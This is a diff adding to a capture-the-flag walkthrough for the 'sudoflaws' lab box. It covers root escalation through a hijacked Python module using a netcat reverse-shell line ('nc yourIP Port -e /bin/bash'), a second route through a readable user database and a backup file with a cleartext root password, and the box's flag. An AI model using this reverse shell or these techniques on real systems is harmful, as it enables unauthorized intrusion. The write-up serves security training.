@@ -65,6 +65,7 @@ www-data@ip-172-31-57-243:/home$ cat todo.txt
 Always read books from library especially OS books!
 You can also try the most simplest encryption method!
 ```
+
 Interesting!
 
 We also see a program called `devs_note.py`
@@ -72,6 +73,52 @@ We also see a program called `devs_note.py`
 ![devs_note](https://i.ibb.co/q7kd1QY/devsnote.jpg)
 
 From `todo.txt` we see read about OS which is a python module imported in program!
+
+If we run `linenum.sh` we see that the module `os.py` and `base64.py` have root priveleges and also that `devs_note.py` is running in a process. So if we call os.system() we can get root priv.
+
+Create a new file called `somename.py` with content
+
+```
+import os
+
+os.system("nc yourIP Port -e /bin/bash")
+
+````
+
+Run it we get root shell and read the `root.txt` 
+
+![root_flag](https://i.ibb.co/ZYSHQZ0/root.jpg)
+
+## UnIntended Way
+
+If you have ever thought of bypassing the login somehow at `http://100.27.12.78/monitor/settings.php` Then you might have thought that there was a database!
+ 
+Even at the login page there were the location of the database given
+
+![database_location](https://i.ibb.co/Gk3ZzvD/database-location.jpg)
+
+As we had the user `www-data` we can go and read the file `users.db`
+
+![userdb](https://i.ibb.co/Wg109HC/userdb.jpg)
+
+If we decrypt the hash we get result as `darkhaxor` but its not the password but there is also a `user_bckup.db.txt`
+
+where we have the root password in clear text
+
+![rootPass](https://i.ibb.co/n0Cnxgr/root-pass.jpg)
+
+Root owned!
+
+### Flag ~
+
+`sudoflaws{M0ni7oring_m3_huhhh!_Good_k33p_i7_up}`
+
+
+If you really like my box! Drop a review at `aakashadhikari786@gmail.com`
+
+
+
+
 
 
 
